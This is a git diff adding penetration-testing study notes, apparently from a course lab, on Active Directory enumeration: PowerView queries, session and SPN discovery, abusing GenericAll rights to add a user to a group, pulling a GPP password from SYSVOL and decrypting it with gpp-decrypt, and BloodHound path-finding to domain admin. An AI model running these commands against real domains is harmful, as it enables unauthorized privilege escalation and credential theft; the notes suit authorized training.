@@ -2854,4 +2854,158 @@ $sales = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Sales Department))"
 $sales.properties.member
 $group = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Development Department*))"
 ```
+### PowerView
 
+Helpful module for automating the above
+```
+Import-Module .\PowerView.ps1
+```
+
+Domain info
+```
+Get-NetDomain
+```
+
+Get list of all users in domain
+```
+Get-NetUser | select cn
+Get-NetUser | select cn,pwdlastset,lastlogon
+```
+
+Get groups
+```
+Get-NetGroup | select cn
+Get-NetGroup "Sales Department" | select member
+```
+
+can use Get-NetComputer to enumerate computer objects
+```
+Get-NetComputer
+Get-NetComputer | select operatingsystem,dnshostname
+```
+
+It's a good idea to grab this information early in the assessment to determine the relative age of the systems and to locate potentially weak targets
+
+Can figure out which computers we have admin access on
+```
+Find-LocalAdminAccess
+```
+
+Can use this to figure out who is logged in to a specific computer
+```
+Get-NetSession -ComputerName files04 -verbose
+```
+
+If that fails, we can try PSLoggedon (needs Remote Registry service active)
+```
+.\PsLoggedon.exe \\files04
+```
+
+Services launched by system run in service account
+
+When applications like Exchange,5 MS SQL, or Internet Information Services (IIS) are integrated into AD, a unique service instance identifier known as Service Principal Name (SPN)6 associates a service to a specific service account in Active Directory.
+
+get spns 
+```
+setspn -L iis_service
+Get-NetUser -SPN | select samaccountname,serviceprincipalname
+```
+we can nslookup service principal names to try to get ip address
+```
+nslookup.exe web04.corp.com
+```
+
+### Object Permissions
+interesting permissions
+```
+GenericAll: Full permissions on object
+GenericWrite: Edit certain attributes on the object
+WriteOwner: Change ownership of the object
+WriteDACL: Edit ACE's applied to object
+AllExtendedRights: Change password, reset password, etc.
+ForceChangePassword: Password change for object
+Self (Self-Membership): Add ourselves to for example a group
+```
+
+get users ACE objects
+```
+Get-ObjectAcl -Identity stephanie
+```
+
+we're looking fr ObjectSID, ActiveDirectoryRights, and SecurityIdentifier
+
+we need to convert these into human readable names
+```
+Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
+Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-553
+```
+n short, we are interested in the ActiveDirectoryRights and SecurityIdentifier for each object we enumerate going forward.
+
+GenericAll is the most permissive.  To search for it
+```
+Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights`
+"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName
+```
+net group "Management Department" stephanie /add /domain
+Get-NetGroup "Management Department" | select member
+```
+
+can later delete from group
+```
+net group "Management Department" stephanie /del /domain
+Get-NetGroup "Management Department" | select member
+```
+
+### Enumerating Domain Shares
+list all shares
+```
+Find-DomainShare
+```
+
+In this instance, we'll first focus on SYSVOL,1 as it may include files and folders that reside on the domain controller itself. This particular share is typically used for various domain policies and scripts. By default, the SYSVOL folder is mapped to %SystemRoot%\SYSVOL\Sysvol\domain-name on the domain controller and every domain user has access to it.
+
+```
+ls \\dc1.corp.com\sysvol\corp.com\
+ls \\dc1.corp.com\sysvol\corp.com\Policies\
+cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
+```
+
+can use gpp-decrypt to decrypt AD gpp passwords
+```
+gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
+```
+
+## Automated Enumeration
+### SharpHound
+
+first import it
+```
+Import-Module .\Sharphound.ps1
+```
+
+to start we net to run Invok-Bloodhound
+```
+Get-Help Invoke-BloodHound
+```
+
+Invoke Sharphound -- data in zip files
+```
+Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"
+```
+
+### BloodHound
+
+first have to start neo4j graph database
+neo4j username/password
+```
+sudo neo4j start
+```
+
+now we run
+```
+bloodhound
+```
+
+can run find domain admin and find shortest path to domain admin
+
+need to mark user as owned
